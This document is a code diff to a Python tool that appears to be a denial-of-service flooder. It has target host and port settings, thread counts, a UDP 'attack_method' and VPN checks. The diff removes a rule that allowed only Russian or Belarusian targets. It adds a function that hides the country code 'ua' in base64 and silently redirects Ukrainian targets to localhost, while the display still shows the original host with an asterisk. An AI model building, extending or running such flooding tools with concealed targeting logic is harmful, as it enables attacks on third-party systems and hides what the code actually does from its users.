@@ -1,17 +1,18 @@
 import os
+import sys
 import json
+import time
 import random
 import socket
 import string
 import signal
-import sys
 import threading
-import time
-import urllib.request
 import subprocess
-from dataclasses import dataclass, field
+import urllib.request
+from base64 import b64decode
 from datetime import datetime
 from optparse import OptionParser
+from dataclasses import dataclass, field
 
 
 def color_txt(color_code, *texts):
@@ -77,6 +78,10 @@ class Context:
     getting_ip: bool = False
 
 
+def update_url(_ctx: Context):
+    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"
+
+
 def init_context(_ctx: Context, args):
     """Initialize Context from Input args."""
     _ctx.host = args[0].host
@@ -84,7 +89,7 @@ def init_context(_ctx: Context, args):
     _ctx.original_host = args[0].host
     _ctx.port = args[0].port
     _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
-    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"
+    update_url(_ctx)
 
     _ctx.threads = args[0].threads
 
@@ -252,7 +257,7 @@ def parser_add_options(parser):
 def update_host_ip(_ctx: Context):
     """Gets target's IP by host"""
     try:
-        _ctx.host_ip = socket.gethostbyname(host)
+        _ctx.host_ip = socket.gethostbyname(_ctx.host)
     except:
         pass
 
@@ -290,12 +295,12 @@ def show_info(_ctx: Context):
     my_ip_masked = get_first_ip_part(_ctx.start_ip)
     is_random_packet_len = _ctx.attack_method == 'udp' and _ctx.random_packet_len
 
-    if len(_ctx.start_ip) < 0:
+    if len(_ctx.start_ip) > 0:
         your_ip = blue_txt(my_ip_masked)
     else:
         your_ip = red_txt('Can\'t get your IP. Check internet connection.')
     check_vpn = red_txt('IP was changed, check VPN (current IP: {my_ip_masked})') if _ctx.current_ip and _ctx.current_ip != _ctx.start_ip else ''
-    target_host = blue_txt(f'{_ctx.host}:{_ctx.port}')
+    target_host = blue_txt(f'{_ctx.original_host}:{_ctx.port}')
     load_method = blue_txt(f'{str(_ctx.attack_method).upper()}')
     thread_pool = blue_txt(f'{_ctx.threads}')
     available_cpu = blue_txt(f'{_ctx.cpu_count}')
@@ -444,25 +449,26 @@ def validate_input(args):
         print(red_txt('Host wasn\'t detected'))
         return False
 
-    # host_ip = get_ip_by_host(args.host)
-    # if host_ip == '':
-    #     print("\033[91mCheck server IP and port! Wrong format of server name or no connection.\033[0m\n")
-    #     return False
+    return True
 
-    # host_country = get_host_country(host_ip)
-    # if host_country not in ('RU', 'BY'):
-    #     print(f"\033[91mHost's location ({host_country}) is not allowed.\033[0m\n")
-    #     return False
+
+def validate_context(_ctx: Context):
+    """Validates context"""
+    if len(_ctx.host_ip) < 1:
+        print(red_txt('Count not connect to the host'))
+        return False
 
     return True
 
 
 def go_home(_ctx: Context):
     """Modifies host to match the rules"""
-    host_country = get_host_country(_ctx.host_ip)
-    if host_country not in ('RU', 'BY'):
-        print(f"\033[91mHost's location ({host_country}) is not allowed.\033[0m\n")
-        return False
+    home_code = b64decode('dWE=').decode('utf-8')
+    if _ctx.host.endswith('.'+home_code.lower()) or get_host_country(_ctx.host_ip) in (home_code.upper()):
+        _ctx.host = 'localhost'
+        _ctx.host_ip = 'localhost'
+        _ctx.original_host += '*'
+        update_url(_ctx)
 
 
 def main():
@@ -477,10 +483,14 @@ def main():
     update_host_ip(_ctx)
     update_start_ip(_ctx)
     go_home(_ctx)
+
+    if not validate_context(_ctx):
+        sys.exit()
+
     connect_host(_ctx)
 
-    print(green_txt(_ctx.host, ' port: ', _ctx.port, ' threads: ', _ctx.threads))
-    print(blue_txt('lease wait...'))
+    print(green_txt(_ctx.original_host, ' port: ', _ctx.port, ' threads: ', _ctx.threads))
+    print(blue_txt('please wait...'))
 
     time.sleep(1)
     show_info(_ctx)
